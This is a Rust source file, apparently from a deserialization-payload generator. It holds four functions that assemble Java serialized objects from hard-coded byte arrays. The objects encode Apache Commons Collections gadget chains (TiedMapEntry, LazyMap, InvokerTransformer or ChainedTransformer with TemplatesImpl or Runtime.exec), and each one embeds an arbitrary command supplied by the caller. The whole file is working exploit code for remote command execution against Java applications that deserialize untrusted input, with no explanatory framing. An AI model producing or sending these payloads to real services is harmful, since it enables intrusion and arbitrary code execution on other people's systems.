use crate::base::generate_string;
use crate::template_impl::get_k_template_impl;

pub fn get_commons_collections_k1(cmd: &str) -> Vec<u8> {
    let mut result_bytes = [172, 237, 0, 5, 115, 114, 0, 17, 106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 72, 97, 115, 104, 77, 97, 112, 5, 7, 218, 193, 195, 22, 96, 209, 3, 0, 2, 70, 0, 10, 108, 111, 97, 100, 70, 97, 99, 116, 111, 114, 73, 0, 9, 116, 104, 114, 101, 115, 104, 111, 108, 100, 120, 112, 63, 64, 0, 0, 0, 0, 0, 12, 119, 8, 0, 0, 0, 16, 0, 0, 0, 1, 115, 114, 0, 52, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 99, 111, 109, 109, 111, 110, 115, 46, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 46, 107, 101, 121, 118, 97, 108, 117, 101, 46, 84, 105, 101, 100, 77, 97, 112, 69, 110, 116, 114, 121, 138, 173, 210, 155, 57, 193, 31, 219, 2, 0, 2, 76, 0, 3, 107, 101, 121, 116, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 76, 0, 3, 109, 97, 112, 116, 0, 15, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 77, 97, 112, 59, 120, 112, 115, 114, 0, 58, 99, 111, 109, 46, 115, 117, 110, 46, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 120, 97, 108, 97, 110, 46, 105, 110, 116, 101, 114, 110, 97, 108, 46, 120, 115, 108, 116, 99, 46, 116, 114, 97, 120, 46, 84, 101, 109, 112, 108, 97, 116, 101, 115, 73, 109, 112, 108, 9, 87, 79, 193, 110, 172, 171, 51, 3, 0, 6, 73, 0, 13, 95, 105, 110, 100, 101, 110, 116, 78, 117, 109, 98, 101, 114, 73, 0, 14, 95, 116, 114, 97, 110, 115, 108, 101, 116, 73, 110, 100, 101, 120, 91, 0, 10, 95, 98, 121, 116, 101, 99, 111, 100, 101, 115, 116, 0, 3, 91, 91, 66, 91, 0, 6, 95, 99, 108, 97, 115, 115, 116, 0, 18, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 76, 0, 5, 95, 110, 97, 109, 101, 116, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 76, 0, 17, 95, 111, 117, 116, 112, 117, 116, 80, 114, 111, 112, 101, 114, 116, 105, 101, 115, 116, 0, 22, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 80, 114, 111, 112, 101, 114, 116, 105, 101, 115, 59, 120, 112, 0, 0, 0, 0, 255, 255, 255, 255, 117, 114, 0, 3, 91, 91, 66, 75, 253, 25, 21, 103, 103, 219, 55, 2, 0, 0, 120, 112, 0, 0, 0, 1, 117, 114, 0, 2, 91, 66, 172, 243, 23, 248, 6, 8, 84, 224, 2, 0, 0, 120, 112].to_vec();
    let template_impl = get_k_template_impl(cmd);
    let template_impl_len = template_impl.len() as u32;
    result_bytes.extend(template_impl_len.to_be_bytes());
    result_bytes.extend(&template_impl);
    result_bytes.extend([112, 116, 0, 4, 68, 111, 103, 101, 112, 119, 1, 0, 120, 115, 114, 0, 42, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 99, 111, 109, 109, 111, 110, 115, 46, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 46, 109, 97, 112, 46, 76, 97, 122, 121, 77, 97, 112, 110, 229, 148, 130, 158, 121, 16, 148, 3, 0, 1, 76, 0, 7, 102, 97, 99, 116, 111, 114, 121, 116, 0, 44, 76, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 99, 111, 109, 109, 111, 110, 115, 47, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 47, 84, 114, 97, 110, 115, 102, 111, 114, 109, 101, 114, 59, 120, 112, 115, 114, 0, 58, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 99, 111, 109, 109, 111, 110, 115, 46, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 46, 102, 117, 110, 99, 116, 111, 114, 115, 46, 73, 110, 118, 111, 107, 101, 114, 84, 114, 97, 110, 115, 102, 111, 114, 109, 101, 114, 135, 232, 255, 107, 123, 124, 206, 56, 2, 0, 3, 91, 0, 5, 105, 65, 114, 103, 115, 116, 0, 19, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 76, 0, 11, 105, 77, 101, 116, 104, 111, 100, 78, 97, 109, 101, 113, 0, 126, 0, 9, 91, 0, 11, 105, 80, 97, 114, 97, 109, 84, 121, 112, 101, 115, 113, 0, 126, 0, 8, 120, 112, 117, 114, 0, 19, 91, 76, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 79, 98, 106, 101, 99, 116, 59, 144, 206, 88, 159, 16, 115, 41, 108, 2, 0, 0, 120, 112, 0, 0, 0, 0, 116, 0, 14, 110, 101, 119, 84, 114, 97, 110, 115, 102, 111, 114, 109, 101, 114, 117, 114, 0, 18, 91, 76, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 67, 108, 97, 115, 115, 59, 171, 22, 215, 174, 203, 205, 90, 153, 2, 0, 0, 120, 112, 0, 0, 0, 0, 115, 113, 0, 126, 0, 0, 63, 64, 0, 0, 0, 0, 0, 12, 119, 8, 0, 0, 0, 16, 0, 0, 0, 0, 120, 120, 116, 0, 1, 116, 120]);
    return result_bytes;
}
pub fn get_commons_collections_k2(cmd: &str) -> Vec<u8> {
    let mut result_bytes = [172, 237, 0, 5, 115, 114, 0, 17, 106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 72, 97, 115, 104, 77, 97, 112, 5, 7, 218, 193, 195, 22, 96, 209, 3, 0, 2, 70, 0, 10, 108, 111, 97, 100, 70, 97, 99, 116, 111, 114, 73, 0, 9, 116, 104, 114, 101, 115, 104, 111, 108, 100, 120, 112, 63, 64, 0, 0, 0, 0, 0, 12, 119, 8, 0, 0, 0, 16, 0, 0, 0, 1, 115, 114, 0, 53, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 99, 111, 109, 109, 111, 110, 115, 46, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 52, 46, 107, 101, 121, 118, 97, 108, 117, 101, 46, 84, 105, 101, 100, 77, 97, 112, 69, 110, 116, 114, 121, 138, 173, 210, 155, 57, 193, 31, 219, 2, 0, 2, 76, 0, 3, 107, 101, 121, 116, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 76, 0, 3, 109, 97, 112, 116, 0, 15, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 77, 97, 112, 59, 120, 112, 115, 114, 0, 58, 99, 111, 109, 46, 115, 117, 110, 46, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 120, 97, 108, 97, 110, 46, 105, 110, 116, 101, 114, 110, 97, 108, 46, 120, 115, 108, 116, 99, 46, 116, 114, 97, 120, 46, 84, 101, 109, 112, 108, 97, 116, 101, 115, 73, 109, 112, 108, 9, 87, 79, 193, 110, 172, 171, 51, 3, 0, 6, 73, 0, 13, 95, 105, 110, 100, 101, 110, 116, 78, 117, 109, 98, 101, 114, 73, 0, 14, 95, 116, 114, 97, 110, 115, 108, 101, 116, 73, 110, 100, 101, 120, 91, 0, 10, 95, 98, 121, 116, 101, 99, 111, 100, 101, 115, 116, 0, 3, 91, 91, 66, 91, 0, 6, 95, 99, 108, 97, 115, 115, 116, 0, 18, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 76, 0, 5, 95, 110, 97, 109, 101, 116, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 76, 0, 17, 95, 111, 117, 116, 112, 117, 116, 80, 114, 111, 112, 101, 114, 116, 105, 101, 115, 116, 0, 22, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 80, 114, 111, 112, 101, 114, 116, 105, 101, 115, 59, 120, 112, 0, 0, 0, 0, 255, 255, 255, 255, 117, 114, 0, 3, 91, 91, 66, 75, 253, 25, 21, 103, 103, 219, 55, 2, 0, 0, 120, 112, 0, 0, 0, 1, 117, 114, 0, 2, 91, 66, 172, 243, 23, 248, 6, 8, 84, 224, 2, 0, 0, 120, 112].to_vec();
    let template_impl = get_k_template_impl(cmd);
    let template_impl_len = template_impl.len() as u32;
    result_bytes.extend(template_impl_len.to_be_bytes());
    result_bytes.extend(&template_impl);
    result_bytes.extend([112, 116, 0, 4, 68, 111, 103, 101, 112, 119, 1, 0, 120, 115, 114, 0, 43, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 99, 111, 109, 109, 111, 110, 115, 46, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 52, 46, 109, 97, 112, 46, 76, 97, 122, 121, 77, 97, 112, 110, 229, 148, 130, 158, 121, 16, 148, 3, 0, 1, 76, 0, 7, 102, 97, 99, 116, 111, 114, 121, 116, 0, 45, 76, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 99, 111, 109, 109, 111, 110, 115, 47, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 52, 47, 84, 114, 97, 110, 115, 102, 111, 114, 109, 101, 114, 59, 120, 112, 115, 114, 0, 59, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 99, 111, 109, 109, 111, 110, 115, 46, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 52, 46, 102, 117, 110, 99, 116, 111, 114, 115, 46, 73, 110, 118, 111, 107, 101, 114, 84, 114, 97, 110, 115, 102, 111, 114, 109, 101, 114, 135, 232, 255, 107, 123, 124, 206, 56, 2, 0, 3, 91, 0, 5, 105, 65, 114, 103, 115, 116, 0, 19, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 76, 0, 11, 105, 77, 101, 116, 104, 111, 100, 78, 97, 109, 101, 113, 0, 126, 0, 9, 91, 0, 11, 105, 80, 97, 114, 97, 109, 84, 121, 112, 101, 115, 113, 0, 126, 0, 8, 120, 112, 117, 114, 0, 19, 91, 76, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 79, 98, 106, 101, 99, 116, 59, 144, 206, 88, 159, 16, 115, 41, 108, 2, 0, 0, 120, 112, 0, 0, 0, 0, 116, 0, 14, 110, 101, 119, 84, 114, 97, 110, 115, 102, 111, 114, 109, 101, 114, 117, 114, 0, 18, 91, 76, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 67, 108, 97, 115, 115, 59, 171, 22, 215, 174, 203, 205, 90, 153, 2, 0, 0, 120, 112, 0, 0, 0, 0, 115, 113, 0, 126, 0, 0, 63, 64, 0, 0, 0, 0, 0, 12, 119, 8, 0, 0, 0, 16, 0, 0, 0, 0, 120, 120, 116, 0, 1, 116, 120]);
    return result_bytes;
}
pub fn get_commons_collections_k3(cmd: &str) -> Vec<u8> {
    let mut result_bytes = [172, 237, 0, 5, 115, 114, 0, 17, 106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 72, 97, 115, 104, 77, 97, 112, 5, 7, 218, 193, 195, 22, 96, 209, 3, 0, 2, 70, 0, 10, 108, 111, 97, 100, 70, 97, 99, 116, 111, 114, 73, 0, 9, 116, 104, 114, 101, 115, 104, 111, 108, 100, 120, 112, 63, 64, 0, 0, 0, 0, 0, 12, 119, 8, 0, 0, 0, 16, 0, 0, 0, 1, 115, 114, 0, 52, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 99, 111, 109, 109, 111, 110, 115, 46, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 46, 107, 101, 121, 118, 97, 108, 117, 101, 46, 84, 105, 101, 100, 77, 97, 112, 69, 110, 116, 114, 121, 138, 173, 210, 155, 57, 193, 31, 219, 2, 0, 2, 76, 0, 3, 107, 101, 121, 116, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 76, 0, 3, 109, 97, 112, 116, 0, 15, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 77, 97, 112, 59, 120, 112, 116, 0, 1, 118, 115, 114, 0, 42, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 99, 111, 109, 109, 111, 110, 115, 46, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 46, 109, 97, 112, 46, 76, 97, 122, 121, 77, 97, 112, 110, 229, 148, 130, 158, 121, 16, 148, 3, 0, 1, 76, 0, 7, 102, 97, 99, 116, 111, 114, 121, 116, 0, 44, 76, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 99, 111, 109, 109, 111, 110, 115, 47, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 47, 84, 114, 97, 110, 115, 102, 111, 114, 109, 101, 114, 59, 120, 112, 115, 114, 0, 58, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 99, 111, 109, 109, 111, 110, 115, 46, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 46, 102, 117, 110, 99, 116, 111, 114, 115, 46, 67, 104, 97, 105, 110, 101, 100, 84, 114, 97, 110, 115, 102, 111, 114, 109, 101, 114, 48, 199, 151, 236, 40, 122, 151, 4, 2, 0, 1, 91, 0, 13, 105, 84, 114, 97, 110, 115, 102, 111, 114, 109, 101, 114, 115, 116, 0, 45, 91, 76, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 99, 111, 109, 109, 111, 110, 115, 47, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 47, 84, 114, 97, 110, 115, 102, 111, 114, 109, 101, 114, 59, 120, 112, 117, 114, 0, 45, 91, 76, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 99, 111, 109, 109, 111, 110, 115, 46, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 46, 84, 114, 97, 110, 115, 102, 111, 114, 109, 101, 114, 59, 189, 86, 42, 241, 216, 52, 24, 153, 2, 0, 0, 120, 112, 0, 0, 0, 5, 115, 114, 0, 59, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 99, 111, 109, 109, 111, 110, 115, 46, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 46, 102, 117, 110, 99, 116, 111, 114, 115, 46, 67, 111, 110, 115, 116, 97, 110, 116, 84, 114, 97, 110, 115, 102, 111, 114, 109, 101, 114, 88, 118, 144, 17, 65, 2, 177, 148, 2, 0, 1, 76, 0, 9, 105, 67, 111, 110, 115, 116, 97, 110, 116, 113, 0, 126, 0, 3, 120, 112, 118, 114, 0, 17, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 120, 112, 115, 114, 0, 58, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 99, 111, 109, 109, 111, 110, 115, 46, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 46, 102, 117, 110, 99, 116, 111, 114, 115, 46, 73, 110, 118, 111, 107, 101, 114, 84, 114, 97, 110, 115, 102, 111, 114, 109, 101, 114, 135, 232, 255, 107, 123, 124, 206, 56, 2, 0, 3, 91, 0, 5, 105, 65, 114, 103, 115, 116, 0, 19, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 76, 0, 11, 105, 77, 101, 116, 104, 111, 100, 78, 97, 109, 101, 116, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 91, 0, 11, 105, 80, 97, 114, 97, 109, 84, 121, 112, 101, 115, 116, 0, 18, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 120, 112, 117, 114, 0, 19, 91, 76, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 79, 98, 106, 101, 99, 116, 59, 144, 206, 88, 159, 16, 115, 41, 108, 2, 0, 0, 120, 112, 0, 0, 0, 2, 116, 0, 10, 103, 101, 116, 82, 117, 110, 116, 105, 109, 101, 117, 114, 0, 18, 91, 76, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 67, 108, 97, 115, 115, 59, 171, 22, 215, 174, 203, 205, 90, 153, 2, 0, 0, 120, 112, 0, 0, 0, 0, 116, 0, 9, 103, 101, 116, 77, 101, 116, 104, 111, 100, 117, 113, 0, 126, 0, 27, 0, 0, 0, 2, 118, 114, 0, 16, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 83, 116, 114, 105, 110, 103, 160, 240, 164, 56, 122, 59, 179, 66, 2, 0, 0, 120, 112, 118, 113, 0, 126, 0, 27, 115, 113, 0, 126, 0, 19, 117, 113, 0, 126, 0, 24, 0, 0, 0, 2, 112, 117, 113, 0, 126, 0, 24, 0, 0, 0, 0, 116, 0, 6, 105, 110, 118, 111, 107, 101, 117, 113, 0, 126, 0, 27, 0, 0, 0, 2, 118, 114, 0, 16, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 79, 98, 106, 101, 99, 116, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 120, 112, 118, 113, 0, 126, 0, 24, 115, 113, 0, 126, 0, 19, 117, 114, 0, 19, 91, 76, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 83, 116, 114, 105, 110, 103, 59, 173, 210, 86, 231, 233, 29, 123, 71, 2, 0, 0, 120, 112, 0, 0, 0, 1].to_vec();
    result_bytes.extend(generate_string(cmd));
    result_bytes.extend([116, 0, 4, 101, 120, 101, 99, 117, 113, 0, 126, 0, 27, 0, 0, 0, 1, 113, 0, 126, 0, 32, 115, 113, 0, 126, 0, 15, 115, 114, 0, 17, 106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 72, 97, 115, 104, 83, 101, 116, 186, 68, 133, 149, 150, 184, 183, 52, 3, 0, 0, 120, 112, 119, 12, 0, 0, 0, 16, 63, 64, 0, 0, 0, 0, 0, 0, 120, 115, 113, 0, 126, 0, 0, 63, 64, 0, 0, 0, 0, 0, 12, 119, 8, 0, 0, 0, 16, 0, 0, 0, 0, 120, 120, 116, 0, 1, 116, 120]);
    return result_bytes;
}
pub fn get_commons_collections_k4(cmd: &str) -> Vec<u8> {
    let mut result_bytes = [172, 237, 0, 5, 115, 114, 0, 17, 106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 72, 97, 115, 104, 77, 97, 112, 5, 7, 218, 193, 195, 22, 96, 209, 3, 0, 2, 70, 0, 10, 108, 111, 97, 100, 70, 97, 99, 116, 111, 114, 73, 0, 9, 116, 104, 114, 101, 115, 104, 111, 108, 100, 120, 112, 63, 64, 0, 0, 0, 0, 0, 12, 119, 8, 0, 0, 0, 16, 0, 0, 0, 1, 115, 114, 0, 53, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 99, 111, 109, 109, 111, 110, 115, 46, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 52, 46, 107, 101, 121, 118, 97, 108, 117, 101, 46, 84, 105, 101, 100, 77, 97, 112, 69, 110, 116, 114, 121, 138, 173, 210, 155, 57, 193, 31, 219, 2, 0, 2, 76, 0, 3, 107, 101, 121, 116, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 76, 0, 3, 109, 97, 112, 116, 0, 15, 76, 106, 97, 118, 97, 47, 117, 116, 105, 108, 47, 77, 97, 112, 59, 120, 112, 116, 0, 1, 118, 115, 114, 0, 43, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 99, 111, 109, 109, 111, 110, 115, 46, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 52, 46, 109, 97, 112, 46, 76, 97, 122, 121, 77, 97, 112, 110, 229, 148, 130, 158, 121, 16, 148, 3, 0, 1, 76, 0, 7, 102, 97, 99, 116, 111, 114, 121, 116, 0, 45, 76, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 99, 111, 109, 109, 111, 110, 115, 47, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 52, 47, 84, 114, 97, 110, 115, 102, 111, 114, 109, 101, 114, 59, 120, 112, 115, 114, 0, 59, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 99, 111, 109, 109, 111, 110, 115, 46, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 52, 46, 102, 117, 110, 99, 116, 111, 114, 115, 46, 67, 104, 97, 105, 110, 101, 100, 84, 114, 97, 110, 115, 102, 111, 114, 109, 101, 114, 48, 199, 151, 236, 40, 122, 151, 4, 2, 0, 1, 91, 0, 13, 105, 84, 114, 97, 110, 115, 102, 111, 114, 109, 101, 114, 115, 116, 0, 46, 91, 76, 111, 114, 103, 47, 97, 112, 97, 99, 104, 101, 47, 99, 111, 109, 109, 111, 110, 115, 47, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 52, 47, 84, 114, 97, 110, 115, 102, 111, 114, 109, 101, 114, 59, 120, 112, 117, 114, 0, 46, 91, 76, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 99, 111, 109, 109, 111, 110, 115, 46, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 52, 46, 84, 114, 97, 110, 115, 102, 111, 114, 109, 101, 114, 59, 57, 129, 58, 251, 8, 218, 63, 165, 2, 0, 0, 120, 112, 0, 0, 0, 5, 115, 114, 0, 60, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 99, 111, 109, 109, 111, 110, 115, 46, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 52, 46, 102, 117, 110, 99, 116, 111, 114, 115, 46, 67, 111, 110, 115, 116, 97, 110, 116, 84, 114, 97, 110, 115, 102, 111, 114, 109, 101, 114, 88, 118, 144, 17, 65, 2, 177, 148, 2, 0, 1, 76, 0, 9, 105, 67, 111, 110, 115, 116, 97, 110, 116, 113, 0, 126, 0, 3, 120, 112, 118, 114, 0, 17, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 120, 112, 115, 114, 0, 59, 111, 114, 103, 46, 97, 112, 97, 99, 104, 101, 46, 99, 111, 109, 109, 111, 110, 115, 46, 99, 111, 108, 108, 101, 99, 116, 105, 111, 110, 115, 52, 46, 102, 117, 110, 99, 116, 111, 114, 115, 46, 73, 110, 118, 111, 107, 101, 114, 84, 114, 97, 110, 115, 102, 111, 114, 109, 101, 114, 135, 232, 255, 107, 123, 124, 206, 56, 2, 0, 3, 91, 0, 5, 105, 65, 114, 103, 115, 116, 0, 19, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 76, 0, 11, 105, 77, 101, 116, 104, 111, 100, 78, 97, 109, 101, 116, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 91, 0, 11, 105, 80, 97, 114, 97, 109, 84, 121, 112, 101, 115, 116, 0, 18, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 120, 112, 117, 114, 0, 19, 91, 76, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 79, 98, 106, 101, 99, 116, 59, 144, 206, 88, 159, 16, 115, 41, 108, 2, 0, 0, 120, 112, 0, 0, 0, 2, 116, 0, 10, 103, 101, 116, 82, 117, 110, 116, 105, 109, 101, 117, 114, 0, 18, 91, 76, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 67, 108, 97, 115, 115, 59, 171, 22, 215, 174, 203, 205, 90, 153, 2, 0, 0, 120, 112, 0, 0, 0, 0, 116, 0, 9, 103, 101, 116, 77, 101, 116, 104, 111, 100, 117, 113, 0, 126, 0, 27, 0, 0, 0, 2, 118, 114, 0, 16, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 83, 116, 114, 105, 110, 103, 160, 240, 164, 56, 122, 59, 179, 66, 2, 0, 0, 120, 112, 118, 113, 0, 126, 0, 27, 115, 113, 0, 126, 0, 19, 117, 113, 0, 126, 0, 24, 0, 0, 0, 2, 112, 117, 113, 0, 126, 0, 24, 0, 0, 0, 0, 116, 0, 6, 105, 110, 118, 111, 107, 101, 117, 113, 0, 126, 0, 27, 0, 0, 0, 2, 118, 114, 0, 16, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 79, 98, 106, 101, 99, 116, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 120, 112, 118, 113, 0, 126, 0, 24, 115, 113, 0, 126, 0, 19, 117, 114, 0, 19, 91, 76, 106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 83, 116, 114, 105, 110, 103, 59, 173, 210, 86, 231, 233, 29, 123, 71, 2, 0, 0, 120, 112, 0, 0, 0, 1].to_vec();
    result_bytes.extend(generate_string(cmd));
    result_bytes.extend([116, 0, 4, 101, 120, 101, 99, 117, 113, 0, 126, 0, 27, 0, 0, 0, 1, 113, 0, 126, 0, 32, 115, 113, 0, 126, 0, 15, 115, 114, 0, 17, 106, 97, 118, 97, 46, 117, 116, 105, 108, 46, 72, 97, 115, 104, 83, 101, 116, 186, 68, 133, 149, 150, 184, 183, 52, 3, 0, 0, 120, 112, 119, 12, 0, 0, 0, 16, 63, 64, 0, 0, 0, 0, 0, 0, 120, 115, 113, 0, 126, 0, 0, 63, 64, 0, 0, 0, 0, 0, 12, 119, 8, 0, 0, 0, 16, 0, 0, 0, 0, 120, 120, 116, 0, 1, 116, 120]);
    return result_bytes;
}